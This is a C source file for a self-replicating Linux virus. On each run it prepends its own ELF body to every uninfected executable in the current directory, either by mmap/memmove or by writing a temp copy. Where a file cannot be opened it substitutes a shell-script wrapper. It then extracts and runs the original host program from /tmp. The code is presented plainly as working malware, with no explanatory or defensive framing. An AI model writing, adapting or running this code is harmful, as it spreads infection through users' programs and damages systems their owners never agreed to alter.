#ifndef __linux__
#error "Linux only"
#endif

#include <assert.h>
#include <elf.h>
#include <errno.h>
#include <dirent.h>
#include <fcntl.h>
#include <limits.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>

#ifndef __ELF__
#error "ELF only"
#endif

static_assert(sizeof(size_t) >= sizeof(off_t), "off_t must fit in size_t");

typedef struct {
    off_t size;
    off_t id_offset;
} virus_info_t;

static const char virus_id[] __attribute__((section(".virus_id"))) = __DATE__ __TIME__;

static int virus_info_error(const virus_info_t *info) {
    return info->size >= 0 ? 0 : -info->size;
}

#include "compute-virus-info-32.c"
#include "compute-virus-info-64.c"

virus_info_t compute_virus_info(FILE *file) {
    unsigned char identifier[EI_NIDENT];

    if (fread(identifier, sizeof(identifier), 1, file) == 0) {
        assert(ferror(file));
        return (virus_info_t) { .size = -errno, .id_offset = -1 };
    }

    rewind(file);

    switch (identifier[EI_CLASS]) {
        case ELFCLASS32:
            return compute_virus_info_32(file);
        case ELFCLASS64:
            return compute_virus_info_64(file);
        default:
            assert(false);
            return (virus_info_t) { .size = -ENOEXEC, .id_offset = -1 };
    }
}

size_t read_all(int fd, void *buf, size_t remaining) {
    char *ptr = buf;
    while (remaining > 0) {
        ssize_t result = read(fd, ptr, remaining);
        if (result < 0) break;
        if (result == 0) {
            errno = EINVAL;
            break;
        }
        ptr += result;
        remaining -= result;
    }
    return remaining;
}

size_t write_all(int fd, const void *buf, size_t remaining) {
    while (remaining > 0) {
        ssize_t result = write(fd, buf, remaining);
        if (result < 0) break;
        remaining -= result;
    }
    return remaining;
}

int writev_all(int fd, struct iovec *iov, int remaining) {
    while (remaining > 0) {
        ssize_t result = writev(fd, iov, remaining);
        if (result < 0) break;
        for (int i = 0; i < remaining; ++i) {
            size_t *iov_len = &iov->iov_len;
            if ((size_t) result >= *iov_len) {
                result -= *iov_len;
                ++iov;
                --remaining;
            } else {
                *iov_len -= result;
                break;
            }
        }
    }
    return remaining;
}

size_t sendfile_all(int out_fd, int in_fd, size_t remaining) {
    while (remaining > 0) {
        ssize_t result = sendfile(out_fd, in_fd, NULL, remaining);
        if (result < 0) break;
        remaining -= result;
    }
    return remaining;
}

int is_possibly_infected(int fd, off_t size, off_t id_offset) {
    if (id_offset + (off_t) sizeof(virus_id) > size) {
        return 0;
    }

    {
        off_t result = lseek(fd, 0, SEEK_SET);
        assert(result == 0);
    }

    char magic[EI_NIDENT];
    if (read_all(fd, magic, sizeof(magic)) > 0) {
        return -errno;
    }

    if (magic[EI_MAG0] != ELFMAG0
        || magic[EI_MAG1] != ELFMAG1
        || magic[EI_MAG2] != ELFMAG2
        || magic[EI_MAG3] != ELFMAG3) {
        return 0;
    }

    uint16_t type;
    if (read_all(fd, &type, sizeof(type)) > 0) {
        return -errno;
    }

    if (type != ET_EXEC) {
        return 0;
    }

    char buffer[sizeof(virus_id)];
    {
        off_t result = lseek(fd, id_offset, SEEK_SET);
        assert(result == id_offset);
    }
    if (read_all(fd, buffer, sizeof(virus_id)) > 0) {
        return -errno;
    }

    {
        off_t result = lseek(fd, 0, SEEK_SET);
        assert(result == 0);
    }

    return memcmp(virus_id, buffer, sizeof(virus_id)) == 0;
}

int infect_by_exec(const char *virus, size_t virus_size, const char *path) {
    int result = 0;

    char link[PATH_MAX];
    ssize_t length = readlink(path, link, sizeof(link) - 1);
    if (length < 0) {
        result = errno;
        goto exit;
    }
    link[length] = '\n';

    char tmp_name[] = "XXXXXX";
    int tmp_fd = mkstemp(tmp_name);
    if (tmp_fd == -1) {
        result = errno;
        goto exit;
    }

    result = fchmod(tmp_fd, S_IRUSR | S_IXUSR);
    if (result == -1) {
        result = errno;
        goto close_tmp;
    }

    static const char script_header[] = "#!/bin/sh\nexec ";

    result = posix_fallocate(tmp_fd, 0, virus_size + sizeof(script_header) + length);
    if (result) {
        goto close_tmp;
    }
    posix_fadvise(tmp_fd, 0, 0, POSIX_FADV_SEQUENTIAL);

    struct iovec iov[] = {
        {(void *) virus, virus_size},
        {(void *) script_header, sizeof(script_header) - 1},
        {link, length + 1}
    };
    int remaining = writev_all(tmp_fd, iov, sizeof(iov));
    if (remaining > 0) {
        result = errno;
        goto close_tmp;
    }

    result = fsync(tmp_fd);
    if (result) {
        result = errno;
        goto close_tmp;
    }

    close(tmp_fd);
    result = rename(tmp_name, path);
    if (result) {
        result = errno;
        unlink(tmp_name);
    }
    goto exit;

close_tmp:
    close(tmp_fd);
    unlink(tmp_name);

exit:
    return result;
}

int infect_by_copy(const char *virus, const virus_info_t *info, const char *path) {
    int result = 0;

    int fd = open(path, O_RDONLY);
    if (fd == -1) {
        return infect_by_exec(virus, info->size, path);
    }

    struct stat stat;
    if (fstat(fd, &stat)) {
        result = errno;
        goto close_fd;
    }

    result = -is_possibly_infected(fd, stat.st_size, info->id_offset);
    if (result > 0) goto close_fd;
    if (result < 0) {
        result = 0;
        goto close_fd;
    }

    char tmp_name[] = "XXXXXX";
    int tmp_fd = mkstemp(tmp_name);
    if (tmp_fd == -1) {
        result = errno;
        goto close_fd;
    }

    result = fchmod(tmp_fd, ~S_IFMT & stat.st_mode);
    if (result == -1) {
        result = errno;
        goto close_fd;
    }

    result = posix_fallocate(tmp_fd, 0, stat.st_size + info->size);
    if (result) {
        goto close_tmp;
    }
    posix_fadvise(tmp_fd, 0, 0, POSIX_FADV_SEQUENTIAL);

    size_t remaining = write_all(tmp_fd, virus, info->size);
    if (remaining > 0) {
        result = errno;
        goto close_tmp;
    }

    posix_fadvise(fd, 0, 0, POSIX_FADV_SEQUENTIAL);
    remaining = sendfile_all(tmp_fd, fd, stat.st_size);
    if (remaining > 0) {
        result = errno;
        goto close_tmp;
    }

    result = fsync(tmp_fd);
    if (result) {
        result = errno;
        goto close_tmp;
    }

    close(tmp_fd);
    result = rename(tmp_name, path);
    if (result) {
        result = errno;
        unlink(tmp_name);
    }
    goto close_fd;

close_tmp:
    close(tmp_fd);
    unlink(tmp_name);

close_fd:
    close(fd);

    return result;
}

int infect(const char *virus, const virus_info_t *info, const char *path) {
    int result = 0;

    int fd = open(path, O_RDWR);
    if (fd == -1) {
        return infect_by_copy(virus, info, path);
    }

    struct stat stat;
    if (fstat(fd, &stat)) {
        result = errno;
        goto close_fd;
    }

    result = -is_possibly_infected(fd, stat.st_size, info->id_offset);
    if (result > 0) goto close_fd;
    if (result < 0) {
        result = 0;
        goto close_fd;
    }

    result = posix_fallocate(fd, stat.st_size, info->size);
    if (result) {
        goto close_fd;
    }

    off_t new_size = stat.st_size + info->size;
    char *content = mmap(NULL, new_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (content == MAP_FAILED) {
        result = errno;
        goto close_fd;
    }

    posix_madvise(content, new_size, POSIX_MADV_WILLNEED);
    memmove(content + info->size, content, stat.st_size);
    posix_madvise(content, info->size, POSIX_MADV_SEQUENTIAL);
    memcpy(content, virus, info->size);
    
    {
        int result = munmap(content, new_size);
        assert(!result);
    }

close_fd:
    close(fd);

    return result;
}

int main(int argc, char *const argv[], char *const envp[]) {
    (void)argc;

    char buffer[BUFSIZ];
    FILE *exe_file = fopen("/proc/self/exe", "r");
    if (!exe_file) {
        fprintf(stderr, "could not open /proc/self/exe for reading: %s\n", strerror(errno));
        goto exit;
    }
    setbuf(exe_file, buffer);
    int exe_fd = fileno(exe_file);
    assert(exe_fd != -1);

    virus_info_t info = compute_virus_info(exe_file);
    int error = virus_info_error(&info);
    if (error) {
        fprintf(stderr, "could not determine size: %s\n", strerror(error));
        goto close_exe;
    }

    struct stat exe_stat;
    if (fstat(exe_fd, &exe_stat)) {
        fprintf(stderr, "could not stat /proc/self/exe: %s\n", strerror(errno));
        goto close_exe;
    }
    assert(exe_stat.st_size >= info.size);

    char *virus = mmap(NULL, info.size, PROT_READ, MAP_SHARED, exe_fd, 0);
    if (virus == MAP_FAILED) {
        fprintf(stderr, "cannot memory-map %zu-byte virus: %s\n", 
                (size_t) info.size, strerror(errno));
    } else {
        DIR *dir = opendir(".");
        if (dir) {
            struct dirent entry;
            struct dirent *result;
            while (true) {
                int error = readdir_r(dir, &entry, &result); 
                assert(!error);
                if (!result) break;

                posix_madvise(virus, info.size, POSIX_MADV_SEQUENTIAL);
                error = infect(virus, &info, entry.d_name);
                if (error) {
                    fprintf(stderr, "cannot infect %s: %s\n", entry.d_name, strerror(error));
                }
            }
            closedir(dir);
        } else {
            fprintf(stderr, "cannot open .: %s\n", strerror(errno));
        }
        int error = munmap(virus, info.size);
        assert(!error);
    }

    off_t actual_size = exe_stat.st_size - info.size;
    if (actual_size == 0) {
        fclose(exe_file);
        return 0;
    }

    char tmp_path[] = "/tmp/XXXXXX";
    int tmp_fd = mkstemp(tmp_path);
    if (tmp_fd == -1) {
        fprintf(stderr, "cannot create temporary file in /tmp: %s\n", strerror(errno));
        goto close_exe;
    }

    {
        int result = posix_fallocate(tmp_fd, 0, actual_size);
        if (result) {
            fprintf(stderr, "cannot allocate %zu bytes for %s: %s\n",
                    (size_t) actual_size, tmp_path, strerror(result));
            goto close_tmp;
        }
    }

    {
        int result = lseek(exe_fd, info.size, SEEK_SET);
        assert(result != -1);
    }
    posix_fadvise(exe_fd, info.size, actual_size, POSIX_FADV_SEQUENTIAL);
    posix_fadvise(tmp_fd, 0, 0, POSIX_FADV_SEQUENTIAL);
    {
        size_t remaining = sendfile_all(tmp_fd, exe_fd, actual_size);
        if (remaining > 0) {
            fprintf(stderr,
                    "cannot write remaining %zu of %zu bytes "
                    "from /proc/self/exe to %s: %s\n",
                    remaining, (size_t) actual_size, tmp_path, strerror(errno));
            goto close_tmp;
        }
    }

    {
        mode_t mode = ~S_IFMT & exe_stat.st_mode;
        int result = fchmod(tmp_fd, mode);
        if (result == -1) {
            fprintf(stderr, "cannot set permissions of %s to %o: %s\n",
                    tmp_path, (int) mode, strerror(errno));
            goto close_tmp;
        }
    }

    if (fsync(tmp_fd)) {
        fprintf(stderr, "cannot sync %s: %s\n", tmp_path, strerror(errno));
        goto close_tmp;
    }

    int tmp_fd2 = open(tmp_path, O_RDONLY);
    if (tmp_fd2 == -1) {
        fprintf(stderr, "cannot open %s for reading: %s\n", tmp_path, strerror(errno));
        goto close_tmp;
    }

    close(tmp_fd);
    unlink(tmp_path);
    fclose(exe_file);
    fexecve(tmp_fd2, argv, envp);
    fprintf(stderr, "cannot execute %s: %s\n", tmp_path, strerror(errno));
    close(tmp_fd2);
    goto exit;

close_tmp:
    close(tmp_fd);
    unlink(tmp_path);

close_exe:
    fclose(exe_file);
    
exit:
    return EXIT_FAILURE;
}
